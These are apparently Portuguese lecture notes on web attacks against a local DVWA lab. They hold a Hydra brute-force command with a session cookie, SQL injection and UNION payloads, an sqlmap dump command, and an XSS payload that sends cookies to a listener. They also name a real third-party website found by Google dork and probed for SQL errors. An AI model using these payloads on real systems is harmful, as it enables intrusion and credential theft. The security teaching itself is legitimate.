# Aula 30/10: Invas√£o e Seguran√ßa

---

## üõ†Ô∏è Necess√°rio para Atividade (Redes Wireless)

* `iwconfig`
* `airmon-ng check` (lista os processos da rede)
* `airmon-ng check kill` (mata os processos)
* `airmon-ng start wlan0` `#‚Üí depende da sua m√°quina`
* `airodump-ng wlan0mon` (redes ocultas)
    * `-> wlan0mon`

## üñ•Ô∏è In√≠cio da Aula (Servi√ßos Web)

* `sudo service apache2 restart`
* `sudo service mysql restart`

---

## üõ°Ô∏è Vulnerabilidades e Ataques

### File Upload

* Vulnerabilidade presente em servi√ßos web que permitem uploads negligentes de arquivos maliciosos.

### Brute Force (For√ßa Bruta)

* **M√©todo Exaustivo (Tentativa e Erro):** Utilizado para decodificar dados confidenciais ou identificar credenciais de autentica√ß√£o.
* **Diferen√ßa:** N√£o utiliza uma estrat√©gia intelectual, simplesmente faz v√°rias tentativas usando diferentes combina√ß√µes de caracteres at√© encontrar a correta.
* **Analogia:** √â como um ladr√£o tentando arrombar um cofre experimentando todas as combina√ß√µes.
* **Execu√ß√£o:** Geralmente executados por scripts que t√™m como alvo a p√°gina de login de um site, ou por ferramentas que recebem como entrada um arquivo criptografado.
* **Probabilidade de Sucesso:** S√£o ataques relativamente simples de executar e, se houver tempo suficiente e nenhuma estrat√©gia de mitiga√ß√£o, possuem consider√°vel probabilidade de sucesso.
* **Seguran√ßa:** Todos os sistemas existentes baseados em senha ou em chave de criptografia podem ser quebrados com o uso de for√ßa bruta. O tempo que um ataque de for√ßa bruta necessita para invadir um sistema √© uma m√©trica √∫til para medir o n√≠vel de seguran√ßa.

#### Ferramentas Necess√°rias

* **Hydra:** Ferramenta para descoberta de credenciais atrav√©s de t√©cnicas de for√ßa bruta (tentativa e erro), operando atrav√©s de:
    * **Aplica√ß√µes Alvo:** Tem suporte aos servi√ßos telnet, formul√°rios http/https, ssh, mysql, postgree, entre outros.
    * **Wordlist:** Arquivos contendo uma s√©rie de combina√ß√µes de usu√°rios/senhas/hashes.
    * `hydra --version`
* **Burp Repeater:** Permite manipular e reenviar requisi√ß√µes web.
* **Burp Proxy:** Permite capturar requisi√ß√µes web e respostas intercambiadas entre o navegador e a aplica√ß√£o.

#### C√≥digo de Force Brute (Exemplo com Hydra)

```bash
hydra 127.0.0.1 -l admin -P /usr/share/wordlists/rockyou.txt.gz http-get-form '/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=m598o9dgbp1108168nsodnug69; security=low:F=Username and/or password incorrect.'
```
### Nota sobre o Cookie
* **Cookie:** `PHPSESSID=m598o9dgbp1108168nsodnug69;` -> Conseguir do *inspect* (F12, olhar os Cookies, buscar o PHPSESSID).

---

## SQL Injection (Inje√ß√£o SQL)

* Ocorre quando dados **n√£o confi√°veis** s√£o inseridos diretamente em uma instru√ß√£o SQL sem valida√ß√£o ou sanitiza√ß√£o adequada.
* Os invasores exploram essa falha ao fornecer dados maliciosos que alteram a l√≥gica da consulta, permitindo a execu√ß√£o de comandos n√£o autorizados.

### Comandos SQL B√°sicos

```sql
sudo mysql
show databases;
use dvwa;
show tables;
select * from users;
select * from users where user = ‚Äòadmin‚Äô and password=‚Äô‚Äô;
```
## Explora√ß√£o B√°sica (DVWA)

* **Inje√ß√£o SQL:** `select * from users where user = '' or 1=1 limit 1;-- and password='';`

### An√°lise da Query Injetada:

* `SELECT * FROM users`: Solicita todas as colunas da tabela "users".
* `WHERE user = '' OR 1 = 1`: A express√£o `1=1` √© **universalmente verdadeira**, o que faz com que a condi√ß√£o seja sempre satisfeita. A consulta ignorar√° o valor real na coluna "User" e retornar√° todos os registros da tabela.

### Burlar a Busca (Limitando a Registros):

* `select * from users where user = '' or 1=1 limit 1 offset 4--;`

* **An√°lise do Limit/Offset:** Limita o resultado a apenas **1 registro** com um **deslocamento (offset) de 4**. A consulta ir√° pular os primeiros 4 registros e exibir apenas o quinto.

### Explora√ß√£o com UNION (DVWA)

* **Inje√ß√£o (Exemplo 1):** `1. %‚Äô or 1=2 union select 1, version() #`
* **Inje√ß√£o (Exemplo 2):** `2. %‚Äô or 1=2 union select ‚Äòthiago‚Äô, version() #`
* `3. %‚Äô` (id vazio) encerra o primeiro par√¢metro da query.
* `4. 1=2` n√£o retorna ningu√©m (`1‚â†2`).
* `union` concatena com a query seguinte.
* Retorna o `select ‚Äòthiago‚Äô` e a vers√£o `version()`.
* Como √© poss√≠vel observar no DVWA, s√£o solicitados 2 campos (`first_name`, `last_name`), logo solicitamos o `select ‚Äòthiago‚Äô` e `version()` (uma tupla).
* `select first_name, last_name from users where user+id = ‚Äò$id‚Äô;‚Äô;`

---

## Identifica√ß√£o e Automa√ß√£o (SQLi)

* **Procurar no Google:** `inurl: id=`
* **Site Encontrado:** `https://megaplastico.com.br/produtos.php?id=13`
* **Poluir Final da URL:** `https://megaplastico.com.br/produtos.php?id=13‚Äô` (Tela fatal error apresenta p√°gina com falha de SQL).

### Identifica√ß√£o:

* Aus√™ncia de tratamento ou valida√ß√£o de par√¢metros.
* `error in your sql syntax`

### Automatizar com sqlmap:

```bash
sqlmap -u '' -cookie="security=low; PHPSESSID=m598o9dgbp1108168nsodnug69" -D dvwa -T users -columns
```
##  Rainbow Tables

* Tabelas contendo **hash de senhas populares**.

---

##  Cross-site Scripting (XSS)

* **Tipo de Ataque:** Inje√ß√£o de c√≥digo malicioso em aplica√ß√µes web. O hacker injeta c√≥digos **JavaScript** em um campo de texto de uma p√°gina, e esse JavaScript √© executado pelo navegador do usu√°rio.
* **Causa:** Falha na **valida√ß√£o dos dados de entrada** do usu√°rio e na resposta do servidor web.
* **Exemplo:** Um atacante injeta um script que ir√° executar a√ß√µes maliciosas, como **copiar cookies, tokens** ou roubar dados de acesso.
* **Mecanismo:** Atacante gera URL com script e o envia para o alvo.

### Tipos de XSS

1.  **Persistente (Stored):** O script injetado fica alojado de forma **permanente no servidor de destino**.
2.  **N√£o Persistente/Refletido (Reflected):** O script **n√£o fica alojado** no servidor; precisa ser entregue a cada v√≠tima (engenharia social ou resultado de busca). Ao acionar o servidor por meio do link, o script √© **refletido e executado** no navegador. (Esta t√©cnica √© a mais frequente).
3.  **Baseado em DOM (DOM-based):** Explora o Document Object Model (DOM). O script √© capaz de alterar as propriedades das aplica√ß√µes **diretamente no navegador**, sem necessidade de intera√ß√£o com o servidor. A falha est√° na valida√ß√£o do c√≥digo HTML ou XML no navegador.


<img width="602" height="661" alt="image" src="https://github.com/user-attachments/assets/35051847-3653-468b-929b-9afb7e3506c8" />
Persiste no banco de dados

<img width="602" height="661" alt="image" src="https://github.com/user-attachments/assets/bd168921-9031-40f7-85d3-793d861de5bf" />
N√£o persiste no banco de dados

<img width="602" height="661" alt="image" src="https://github.com/user-attachments/assets/fe7c5e45-769f-4d90-beaa-2eecbbaef01f" />
adicionar script na url depois do default



### Obten√ß√£o de Sess√£o (Exemplo)


* **Uso de XSS para obter sess√£o de usu√°rio autenticado:**

```bash
python -m http.server 4444
<script>window.location=‚Äôhttp://127.0.0.1:4444/‚Äô+document.cookie;</script>
```


